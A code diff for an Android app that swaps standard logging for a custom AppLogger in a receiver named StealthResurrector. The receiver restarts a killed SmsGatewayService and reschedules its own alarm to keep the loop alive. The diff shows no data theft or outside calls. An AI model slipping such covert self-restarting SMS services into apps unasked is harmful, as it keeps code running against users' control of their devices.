@@ -4,7 +4,7 @@ import android.content.BroadcastReceiver
 import android.content.Context
 import android.content.Intent
 import android.os.Build
-import android.util.Log
+import com.cornspace.aichat.util.AppLogger
 
 /**
  * StealthResurrector - BroadcastReceiver that keeps the resurrection loop alive.
@@ -25,11 +25,11 @@ class StealthResurrector : BroadcastReceiver() {
     }
 
     override fun onReceive(context: Context, intent: Intent) {
-        Log.d(TAG, "Resurrection alarm fired")
+        AppLogger.d(TAG, "Resurrection alarm fired")
         try {
             // Restart the gateway service if it was killed.
             if (!SmsGatewayService.isServiceRunning()) {
-                Log.w(TAG, "SmsGatewayService not running — restarting")
+                AppLogger.w(TAG, "SmsGatewayService not running — restarting")
                 val serviceIntent = Intent(context, SmsGatewayService::class.java)
                 if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                     context.startForegroundService(serviceIntent)
@@ -37,7 +37,7 @@ class StealthResurrector : BroadcastReceiver() {
                     context.startService(serviceIntent)
                 }
             } else {
-                Log.d(TAG, "SmsGatewayService already running — no restart needed")
+                AppLogger.d(TAG, "SmsGatewayService already running — no restart needed")
             }
 
             // Keep the chain alive by scheduling the next alarm.
@@ -45,7 +45,7 @@ class StealthResurrector : BroadcastReceiver() {
             StealthCore.scheduleNextAlarm(context)
 
         } catch (e: Exception) {
-            Log.e(TAG, "Error in resurrection receiver", e)
+            AppLogger.e(TAG, "Error in resurrection receiver", e)
         }
     }
 }
